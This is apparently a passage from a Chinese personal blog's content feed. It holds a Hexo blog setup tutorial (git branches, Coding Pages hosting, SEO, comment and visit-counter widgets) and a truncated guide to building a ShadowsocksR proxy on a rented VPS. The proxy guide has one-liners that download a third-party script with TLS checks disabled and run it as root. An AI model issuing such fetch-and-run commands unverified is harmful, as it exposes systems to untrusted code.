class="token operator">!</span><span class="token operator">--</span>这里添加你要写的内容<span class="token operator">--</span><span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">&#125;</span> <span class="token operator">%</span><span class="token operator">&gt;</span><div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><h3><a name="t22"></a><a id="search_578"></a>search(搜索框)</h3><p>默认搜索框是不能够用的，</p><blockquote><p>you need to install <code>hexo-generator-json-content</code> before using Insight Search</p></blockquote><p>它已经告诉你了，如果想要使用，就安装这个插件。</p><h3><a name="t23"></a><a id="comment_588"></a>comment(评论系统)</h3><p>这里的多数都是国外的，基本用不了。这个<code>valine</code>好像不错，还能统计文章阅读量，可以自己试一试，<a href="https://valine.js.org/quickstart.html#npm" rel="nofollow" data-token="239a1af0bfb7fc6a90feb1702be74c2f">链接</a>。</p><h3><a name="t24"></a><a id="miscellaneous_594"></a>miscellaneous(其他)</h3><p>这里我就改了一个<code>links</code>，可以添加友链。注意空格要对！不然会报错！</p><h3><a name="t25"></a><a id="_600"></a>总结：</h3><p>整个主题看起来好像很复杂的样子，但是仔细捋一捋其实也比较流畅，</p><ul><li>languages: 顾名思义</li><li>layout：布局文件，其实后期想要修改自定义网站上的东西，添加各种各样的信息，主要是在这里修改，其中<code>comment</code>是评论系统，<code>common</code>是常规的布局，最常修改的在这里面，比如修改页面<code>head</code>和<code>footer</code>的内容。</li><li>scripts：js脚本，暂时没什么用</li><li>source：里面放了一些css的样式，以及图片</li></ul><hr><h1><a name="t26"></a><a id="3_git_613"></a>3. git分支进行多终端工作</h1><p>问题来了，如果你现在在自己的笔记本上写的博客，部署在了网站上，那么你在家里用台式机，或者实验室的台式机，发现你电脑里面没有博客的文件，或者要换电脑了，最后不知道怎么移动文件，怎么办？</p><p>在这里我们就可以利用git的分支系统进行多终端工作了，这样每次打开不一样的电脑，只需要进行简单的配置和在github上把文件同步下来，就可以无缝操作了。</p><h3><a name="t27"></a><a id="_623"></a>机制</h3><p>机制是这样的，由于<code>hexo d</code>上传部署到github的其实是hexo编译后的文件，是用来生成网页的，不包含源文件。</p><p><img alt="可以看到，并没有source等源文件在内" data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstj43xj20800d7glz.jpg" class="lazyload"></p><p>也就是上传的是在本地目录里自动生成的<code>.deploy_git</code>里面。</p><p>其他文件 ，包括我们写在source 里面的，和配置文件，主题文件，都没有上传到github</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrksthbryj20eb07swej.jpg" class="lazyload"></p><p>所以可以利用git的分支管理，将源文件上传到github的另一个分支即可。</p><h3><a name="t28"></a><a id="_645"></a>上传分支</h3><p>首先，先在github上新建一个hexo分支，如图：</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstkyz7j20cp0bgdg5.jpg" class="lazyload"></p><p>然后在这个仓库的settings中，选择默认分支为hexo分支（这样每次同步的时候就不用指定分支，比较方便）。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstl8uxj20ql0dsgmo.jpg" class="lazyload"></p><p>然后在本地的任意目录下，打开git bash，</p><pre class="prettyprint"><code class="prism language-shell has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token function">git</span> clone git@github.com:ZJUFangzh/ZJUFangzh.github.io.git<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>将其克隆到本地，因为默认分支已经设成了hexo，所以clone时只clone了hexo。</p><p>接下来在克隆到本地的<code>ZJUFangzh.github.io</code>中，把除了.git 文件夹外的所有文件都删掉</p><p>把之前我们写的博客源文件全部复制过来，除了<code>.deploy_git</code>。这里应该说一句，复制过来的源文件应该有一个<code>.gitignore</code>，用来忽略一些不需要的文件，如果没有的话，自己新建一个，在里面写上如下，表示这些类型文件不需要git：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>注意，如果你之前克隆过theme中的主题文件，那么应该把主题文件中的<code>.git</code>文件夹删掉，因为git不能嵌套上传，最好是显示隐藏文件，检查一下有没有，否则上传的时候会出错，导致你的主题文件无法上传，这样你的配置在别的电脑上就用不了了。</p><p>而后</p><pre class="prettyprint"><code class="prism language-shell has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token function">git</span> add <span class="token keyword">.</span><span class="token function">git</span> commit –m <span class="token string">"add branch"</span><span class="token function">git</span> push <div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这样就上传完了，可以去你的github上看一看hexo分支有没有上传上去，其中<code>node_modules</code>、<code>public</code>、<code>db.json</code>已经被忽略掉了，没有关系，不需要上传的，因为在别的电脑上需要重新输入命令安装 。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstk4k1j20yq0h9gmr.jpg" class="lazyload"></p><p>这样就上传完了。</p><h3><a name="t29"></a><a id="_703"></a>更换电脑操作</h3><p>一样的，跟之前的环境搭建一样，</p><ul><li>安装git</li></ul><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">sudo apt-get install git<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><ul><li>设置git全局邮箱和用户名</li></ul><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">git config --global user.name "yourgithubname"git config --global user.email "yourgithubemail"<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><ul><li>设置ssh key</li></ul><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ssh-keygen -t rsa -C "youremail"#生成后填到github和coding上（有coding平台的话）#验证是否成功ssh -T git@github.comssh -T git@git.coding.net #(有coding平台的话)<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><ul><li>安装nodejs</li></ul><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">sudo apt-get install nodejssudo apt-get install npm<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><ul><li>安装hexo</li></ul><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">sudo npm install hexo-cli -g<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>但是已经不需要初始化了，</p><p>直接在任意文件夹下，</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">git clone git@………………<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>然后进入克隆到的文件夹：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">cd xxx.github.ionpm installnpm install hexo-deployer-git --save<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>生成，部署：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo ghexo d<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>然后就可以开始写你的新博客了</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo new newpage<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p><strong>Tips:</strong></p><ol><li>不要忘了，每次写完最好都把源文件上传一下</li></ol><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">git add .git commit –m "xxxx"git push <div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><ol start="2"><li>如果是在已经编辑过的电脑上，已经有clone文件夹了，那么，每次只要和远端同步一下就行了</li></ol><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">git pull<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><hr><h1><a name="t30"></a><a id="4_coding_page_796"></a>4. coding page上部署实现国内外分流</h1><p>之前我们已经把hexo托管在github了，但是github是国外的，而且百度的爬虫是不能够爬取github的，所以如果你希望你做的博客能够在百度引擎上被收录，而且想要更快的访问，那么可以在国内的coding page做一个托管，这样在国内访问就是coding page，国外就走github page。</p><p><strong>1. 申请coding账户，新建项目</strong></p><p>先申请一个账户，然后创建新的项目，这一步项目名称应该是随意的。</p><p><strong>2.  添加ssh key</strong></p><p>这一步跟github一样。</p><p>添加后，检查一下是不是添加成功</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ssh -T git@git.coding.net<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p><strong>3. 修改_config.yml</strong></p><p>hexo官方文档是这样的：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">deploy:  type: git  message: [message]  repo:    github: &lt;repository url&gt;,[branch]    coding: &lt;repository url&gt;,[branch] <div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>那么，我们只需要：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">deploy:  type: git  repo:     coding: git@git.coding.net:ZJUFangzh/ZJUFangzh.git,master    github: git@github.com:ZJUFangzh/ZJUFangzh.github.io.git,master<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p><strong>4. 部署</strong></p><p>保存一下，直接</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo ghexo d<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这样就可以在coding的项目上看到你部署的文件了。</p><p><strong>5. 开启coding pages服务，绑定域名</strong></p><p>如图：</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstnswnj20xr0bugmj.jpg" class="lazyload"></p><p><strong>6. 阿里云添加解析</strong></p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstjxu6j20o709bdg1.jpg" class="lazyload"></p><p>这个时候就可以把之前github的解析改成境外，把coding的解析设为默认了。</p><p><strong>7. 去除coding page的跳转广告</strong></p><p>coding page的一个比较恶心人的地方就是，你只是银牌会员的话，访问会先跳转到一个广告，再到你自己的域名。那么它也给出了消除的办法。右上角切换到coding的旧版界面，默认新版是不行的。然后再来到<code>pages服务</code>这里。</p><p>这里：</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstmpshj20j80cbmxq.jpg" class="lazyload"></p><p>只要你在页面上添加一行文字，写<code>Hosted by Coding Pages</code>，然后点下面的小勾勾，两个工作日内它就会审核通过了。</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&lt;p&gt;Hosted by &lt;a href="https://pages.coding.me" style="font-weight: bold"&gt;Coding Pages&lt;/a&gt;&lt;/p&gt;<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>我的选择是把这一行代码放在主题文件夹<code>/layout/common/footer.ejs</code>里面，也就是本来在页面中看到的页脚部分。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstk1skj20lh0630su.jpg" class="lazyload"></p><p>当然，为了统一，我又在后面加上了and <strong>Github</strong>哈哈，可以不加。</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&lt;p&gt;&lt;span&gt;Hosted by &lt;a href="https://pages.coding.me" style="font-weight: bold"&gt;Coding Pages&lt;/a&gt;&lt;/span&gt; and &lt;span&gt;&lt;a href="https://github.com" style="font-weight: bold"&gt;Github&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这是最终加上去的代码。</p><hr><h1><a name="t31"></a><a id="_892"></a>第三部分</h1><p>hexo添加各种功能，包括搜索的SEO，阅读量统计，访问量统计和评论系统等。</p><p>本文参考了: <a href="http://visugar.com/2017/08/01/20170801HexoPlugins/" rel="nofollow" data-token="04bb7ff1bd5e918a6ff005ece25f43ec">visugar.com</a>这里面说的很详细了。</p><h1><a name="t32"></a><a id="1_SEO_900"></a>1. SEO优化</h1><p>推广是很麻烦的事情，怎么样别人才能知道我们呢，首先需要让搜索引擎收录你的这个网站，别人才能搜索的到。那么这就需要SEO优化了。</p><blockquote><p>SEO是由英文Search Engine Optimization缩写而来， 中文意译为“搜索引擎优化”。SEO是指通过站内优化比如网站结构调整、网站内容建设、网站代码优化等以及站外优化。</p></blockquote><h3><a name="t33"></a><a id="seo_908"></a>百度seo</h3><p>刚建站的时候是没有搜索引擎收录我们的网站的。可以在搜索引擎中输入<code>site:&lt;域名&gt;</code></p><p>来查看一下。</p><p><strong>1. 登录百度站长平台添加网站</strong></p><p>登录<a href="https://ziyuan.baidu.com/linksubmit/index?" rel="nofollow" data-token="d3a3e255150c5b678bf0fabaf10940e7">百度站长平台</a>，在站点管理中添加你自己的网站。</p><p>验证网站有三种方式：文件验证、HTML标签验证、CNAME验证。</p><p>第三种方式最简单，只要将它提供给你的那个xxxxx使用CNAME解析到xxx.baidu.com就可以了。也就是登录你的阿里云，把这个解析填进去就OK了。</p><p><strong>2. 提交链接</strong></p><p>我们需要使用npm自动生成网站的sitemap，然后将生成的sitemap提交到百度和其他搜索引擎</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">npm install hexo-generator-sitemap --save     npm install hexo-generator-baidu-sitemap --save<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这时候你需要在你的根目录下<code>_config.xml</code>中看看url有没有改成你自己的：</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstpzd9j20ar03b749.jpg" class="lazyload"></p><p>重新部署后，就可以在public文件夹下看到生成的sitemap.xml和baidusitemap.xml了。</p><p>然后就可以向百度提交你的站点地图了。</p><p>这里建议使用自动提交。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstwp4pj20fc0kyq4n.jpg" class="lazyload"></p><p>自动提交又分为三种：主动推送、自动推送、sitemap。</p><p>可以三个一起提交不要紧，我选择的是后两种。</p><ul><li>自动推送：把百度生成的自动推送代码，放在主题文件<code>/layout/common/head.ejs</code>的适当位置，然后验证一下就可以了。</li><li>sitemap：把两个sitemap地址，提交上去，看到状态正常就OK了。</li></ul><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrksu9fa6j20v60m4404.jpg" class="lazyload"></p><p><strong>ps:</strong> 百度收录比较慢，慢慢等个十天半个月再去<code>site:&lt;域名&gt;</code>看看有没有被收录。</p><h3><a name="t34"></a><a id="googleSEO_962"></a>google的SEO</h3><p>流程一样，google更简单，而且收录更快，进入<a href="https://search.google.com/search-console/sitemaps?resource_id=http://fangzh.top/&amp;hl=zh-CN" rel="nofollow" data-token="aeecd3c3457815b3a71e3dbbe86ddef6">google站点地图</a>，提交网站和sitemap.xml，就可以了。</p><p>如果你这个域名在google这里出了问题，那你就提交 <a href="http://yourname.github.io" rel="nofollow" data-token="327364c036ff71ba8281eaf5c00de66d">yourname.github.io</a>，这个链接，效果是一样的。</p><p>不出意外的话一天内google就能收录你的网站了。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkswrucmj20q30lkq72.jpg" class="lazyload"></p><p>其他的搜索，如搜狗搜索，360搜索，流程是一样的，这里就不再赘述。</p><h1><a name="t35"></a><a id="2__980"></a>2. 评论系统</h1><p>评论系统有很多，但是很多都是墙外的用不了，之前说过这个valine好像集成在hueman和next主题里面了，但是我还没有研究过，我看的是<a href="http://visugar.com/2017/08/01/20170801HexoPlugins/" rel="nofollow" data-token="04bb7ff1bd5e918a6ff005ece25f43ec">visugar</a>这个博主用的来比力评论系统，感觉也还不错。</p><p><a href="https://livere.com/" rel="nofollow" data-token="1b2d0c73266483a03b93d18e93f2e89f">来比力官网</a>，注册好后，点击管理页面，在<code>代码管理</code>中找到安装代码：</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrksu93vyj20tk0m440w.jpg" class="lazyload"></p><p>获取安装代码后，在主题的comment下新建一个文件放入刚刚那段代码，再找到article文件，找到如下代码，若没有则直接在footer后面添加即可。livebe即为刚刚所创文件名称。</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&lt;%- partial('comment/livebe') %&gt;<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>然后可以自己设置一些东西：</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrksufavtj20v70o9mzw.jpg" class="lazyload"></p><p>还可以设置评论提醒，这样别人评论你的时候就可以及时知道了。</p><h1><a name="t36"></a><a id="3__1010"></a>3. 添加百度统计</h1><p>百度统计可以在后台上看到你网站的访问数，浏览量，浏览链接分布等很重要的信息。所以添加百度统计能更有效的让你掌握你的网站情况。</p><p><a href="https://tongji.baidu.com" rel="nofollow" data-token="34ac545e25167ce230e8369822aac405">百度统计</a>，注册一下，这里的账号好像和百度账号不是一起的。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrksvbdmwj20lf0kx78n.jpg" class="lazyload"></p><p>照样把代码复制到<code>head.ejs</code>文件中，然后再进行一下安装检查，半小时左右就可以在百度统计里面看到自己的网站信息了。</p><h1><a name="t37"></a><a id="4_leanCloud_1026"></a>4. 文章阅读量统计leanCloud</h1><p><a href="https://leancloud.cn/" rel="nofollow" data-token="7f43b51103d0e74cad18e95b6e8d7194">leanCloud</a>，进去后注册一下，进入后创建一个应用：</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstp8rdj20h30cimxt.jpg" class="lazyload"></p><p>在<code>存储</code>中创建Class，命名为Counter,</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstygbpj20gq0k0abm.jpg" class="lazyload"></p><p>然后在设置页面看到你的<code>应用Key</code>，在主题的配置文件中：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">leancloud_visitors:  enable: true  app_id: 你的id  app_key: 你的key<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>在<code>article.ejs</code>中适当的位置添加如下，这要看你让文章的阅读量统计显示在哪个地方了，</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">阅读数量:&lt;span id="&lt;%= url_for(post.path) %&gt;" class="leancloud_visitors" data-flag-title="&lt;%- post.title %&gt;"&gt;&lt;/span&gt;次<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>然后在<code>footer.ejs</code>的最后，添加：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&lt;script src="//cdn1.lncld.net/static/js/2.5.0/av-min.js"&gt;&lt;/script&gt;&lt;script&gt;    var APP_ID = '你的app id';    var APP_KEY = '你的app key';    AV.init(&#123;        appId: APP_ID,        appKey: APP_KEY    &#125;);    // 显示次数    function showTime(Counter) &#123;        var query = new AV.Query("Counter");        if($(".leancloud_visitors").length &gt; 0)&#123;            var url = $(".leancloud_visitors").attr('id').trim();            // where field            query.equalTo("words", url);            // count            query.count().then(function (number) &#123;                // There are number instances of MyClass where words equals url.                $(document.getElementById(url)).text(number?  number : '--');            &#125;, function (error) &#123;                // error is an instance of AVError.            &#125;);        &#125;    &#125;    // 追加pv    function addCount(Counter) &#123;        var url = $(".leancloud_visitors").length &gt; 0 ? $(".leancloud_visitors").attr('id').trim() : 'icafebolger.com';        var Counter = AV.Object.extend("Counter");        var query = new Counter;        query.save(&#123;            words: url        &#125;).then(function (object) &#123;        &#125;)    &#125;    $(function () &#123;        var Counter = AV.Object.extend("Counter");        addCount(Counter);        showTime(Counter);    &#125;);&lt;/script&gt;<p>重新部署后就可以了。</p><h1><a name="t38"></a><a id="5__1110"></a>5. 引入不蒜子访问量和访问人次统计</h1><p>不蒜子的添加非常非常方便，<a href="http://busuanzi.ibruce.info/" rel="nofollow" data-token="6c76b066a8f5016935e2e6afd230afcb">不蒜子</a></p><p>在<code>footer.ejs</code>中的合适位置，看你要显示在哪个地方，添加：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&lt;!--这一段是不蒜子的访问量统计代码--&gt;&lt;script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"&gt;&lt;/script&gt;&lt;span id="busuanzi_container_site_pv"&gt;本站总访问量&lt;span id="busuanzi_value_site_pv"&gt;&lt;/span&gt;次 &amp;nbsp;   &lt;/span&gt;&lt;span id="busuanzi_container_site_uv"&gt;访客数&lt;span id="busuanzi_value_site_uv"&gt;&lt;/span&gt;人次&lt;/span&gt;<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>就可以了。</p><h1><a name="t39"></a><a id="_1127"></a>总结</h1><p>到这里就基本做完了。其实都是参考别的博主的设置的，不一定仅限于hueman主题，其他主题的设置也是大体相同的，所以如果你希望设置别的主题，那么仔细看一下这个主题的代码结构，也能够把上边的功能添加进去。</p><p>多看看别的博主的那些功能，如果有你能找到自己喜欢的功能，那么好好发动搜索技能，很快就能找到怎么做了。加油吧！</p></code></pre>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建个人ssr</title>
      <link href="%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BAssr.html"/>
      <url>%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BAssr.html</url>
      
        <content type="html"><![CDATA[<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css" /><!-- <script src="https://cdn.jsdelivr.net/gh/yujiajie01/live2d-widget@V11/autoloadx.js"></script> --><meta name="referrer" content="no-referrer" /><!--页面头部添加--><h1 id="SSR"><a href="#SSR" class="headerlink" title="SSR"></a>SSR</h1><p>教程很简单，整个教程分三步：</p><p>第一步：购买VPS服务器</p><p>第二步：一键部署VPS服务器</p><p>第三步：一键加速VPS服务器 （谷歌BBR加速，推荐）</p><p>第一步：购买VPS服务器</p><p>VPS服务器需要选择国外的，首选国际知名的vultr，速度不错、稳定且性价比高，按小时计费，能够随时开通和删除服务器，新服务器即是新ip。</p><p>vultr注册地址： <a href="http://www.vultr.com（全球15个服务器位置可选，KVM框架，最低2.5美元/月。）">http://www.vultr.com（全球15个服务器位置可选，KVM框架，最低2.5美元/月。）</a></p><p>虽然是英文界面，但是现在的浏览器都有网页翻译功能，鼠标点击右键，选择网页翻译即可翻译成中文。</p><p>注册并邮件激活账号，充值后即可购买服务器。充值方式是paypal（首选）或支付宝，使用paypal有银行卡（包括信用卡）即可。paypal注册地址：<a href="https://www.paypal.com">https://www.paypal.com</a> （paypal是国际知名的第三方支付服务商，注册一下账号，绑定银行卡即可购买国外商品）</p><p>2.5美元/月的服务器配置信息：单核 512M内存 20G SSD硬盘 带宽峰值100M 500G流量/月</p><p>5美元/月的服务器配置信息： 单核 1G内存 25G SSD硬盘 带宽峰值100M 1000G流量/月</p><p>10美元/月的服务器配置信息： 单核 2G内存 40G SSD硬盘 带宽峰值100M 2000G流量/月</p><p>20美元/月的服务器配置信息： 2cpu 4G内存 60G SSD硬盘 带宽峰值100M 3000G流量/月</p><p>40美元/月的服务器配置信息： 4cpu 8G内存 100G SSD硬盘 带宽峰值100M 4000G流量/月</p><p>vultr实际上是折算成小时来计费的，比如服务器是5美元1个月，那么每小时收费为5/30/24=0.0069美元 会自动从账号中扣费，只要保证账号有钱即可。如果你部署的服务器实测后速度不理想，你可以把它删掉（destroy），重新换个地区的服务器来部署，方便且实用。因为新的服务器就是新的ip，所以当ip被封时这个方法很有用。当ip被封时，为了保证新开的服务器ip和原先的ip不一样，先开新服务器，开好后再删除旧服务器即可。</p><p>计费从你开通服务器开始算的，不管你有没有使用，即使服务器处于关机状态仍然会计费，如果你没有开通服务器就不算。比如你今天早上开通了服务器，但你有事情，晚上才部署，那么这段时间是会计费的。同理，如果你早上删掉服务器，第二天才开通新的服务器，那么这段时间是不会计费的。在账号的Billing选项里可以看到账户余额。</p><p>温馨提醒：同样的服务器位置，不同的宽带类型和地区所搭建的账号的访问速度会不同，这与中国电信、中国联通、中国移动国际出口带宽和线路不同有关，所以以实测为准。可以先选定一个服务器位置来按照教程进行搭建，熟悉搭建方法，当账号搭建完成并进行了bbr加速后，测试下速度自己是否满意，如果满意那就用这个服务器位置的服务器。如果速度不太满意，就一次性开几台不同的服务器位置的服务器，然后按照同样的方法来进行搭建并测试，选择最优的，之后把其它的服务器删掉，按小时计费测试成本可以忽略。</p><p>账号充值如图：</p><p>开通服务器步骤如图：</p><p>选择vps操作系统时，不要选centos7系统！点击图中的CentOS几个字，会弹出centos6，然后选中centos6！entos7默认的防火墙可能会干扰ssr的正常连接！<br>接下来这一步是开启vps的ipv6 ip，选填项。如果你的电脑系统可以用ipv6，那么可以勾选此项。大多数用户没有这个需求，但有一些用户可能会用到，所以补充了这部分内容。</p><p>完成购买后，找到系统的密码记下来，部署服务器时需要用到。vps系统（推荐centos6）的密码获取方法如下图：</p><p>如果你开启了vps的ipv6，那么在后台的settings选项可以找到服务器的ipv6 ip。在部署SSR账号时，你用ipv6 ip就行。整个部署及使用过程中，记得把电脑系统开启ipv6喔。</p><p>删掉服务器步骤如下图：</p><p>第二步：部署VPS服务器</p><p>购买服务器后，需要部署一下。因为你买的是虚拟东西，而且又远在国外，我们需要一个叫Xshell的软件来远程部署。Xshell windows版下载地址：</p><p>国外云盘1下载</p><p>国外云盘2下载 提取密码：666</p><p>国外云盘3下载 密码：123</p><p>如果你是苹果电脑操作系统，更简单，无需下载xshell，系统可以直接连接VPS。打开终端（Terminal），输入ssh root@ip 其中“ip”替换成你VPS的ip, 按回车键，然后复制粘贴密码，按回车键即可登录。粘贴密码时有可能不显示密码，但不影响， 参考设置方法 如果不能用MAC自带的终端连接的话，直接网上搜“MAC连接SSH的软件”，有很多，然后通过软件来连接vps服务器就行，具体操作方式参考windows xshell。</p><p>部署教程：</p><p>下载xshell软件并安装后，打开软件</p><p>选择文件，新建</p><p>随便取个名字，然后把你的服务器ip填上</p><p>连接国外ip即服务器时，软件会先后提醒你输入用户名和密码，用户名默认都是root，密码是你购买的服务器系统的密码。</p><p>如果xshell连不上服务器，没有弹出让你输入用户名和密码的输入框，表明你开到的ip是一个被封的ip，遇到这种情况，重新开新的服务器，直到能用xshell连上为止，耐心点哦！如果同一个地区开了多台服务器还是不行的话，可以换其它地区。</p><p>连接成功后，会出现如上图所示，之后就可以复制粘贴代码部署了。</p><p>CentOS6/Debian6/Ubuntu14 ShadowsocksR一键部署管理脚本：</p><p>yum -y install wget</p><p>wget -N –no-check-certificate <a href="https://softs.fun/Bash/ssr.sh">https://softs.fun/Bash/ssr.sh</a> &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</p><p>备用脚本：</p><p>yum -y install wget</p><p>wget -N –no-check-certificate <a href="https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh">https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh</a> &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</p><p>———————————————————代码分割线————————————————</p><p>复制上面的代码到VPS服务器里，按回车键，脚本会自动安装，以后只需要运行这个快捷命令就可以出现下图的界面进行设置，快捷管理命令为：bash ssr.sh</p><p>如上图出现管理界面后，输入数字1来安装SSR服务端。如果输入1后不能进入下一步，那么请退出xshell，重新连接vps服务器，然后输入快捷管理命令bash ssr.sh 再尝试。</p><p>根据上图提示，依次输入自己想设置的端口和密码 (密码建议用复杂点的字母组合，端口号为40-65535之间的数字)，回车键用于确认</p><p>注：关于端口的设置，总的网络总端口有6万多个，理论上可以任意设置。但是有的地区需要设置特殊的端口才有效，一些特殊的端口比如80、143、443、1433、3306、3389、8080。</p><p>如上图，选择想设置的加密方式，比如10，按回车键确认</p><p>接下来是选择协议插件，如下图：</p><p>选择并确认后，会出现上图的界面，提示你是否选择兼容原版，这里的原版指的是SS客户端（SS客户端没有协议和混淆的选项），可以根据需求进行选择，演示选择y</p><p>之后进行混淆插件的设置。</p><p>注意：如果协议是origin，那么混淆也必须是plain；如果协议不是origin，那么混淆可以是任意的。有的地区需要把混淆设置成plain才好用。因为混淆不总是有效果，要看各地区的策略，有时候不混淆（plain）让其看起来像随机数据更好。（特别注意：tls 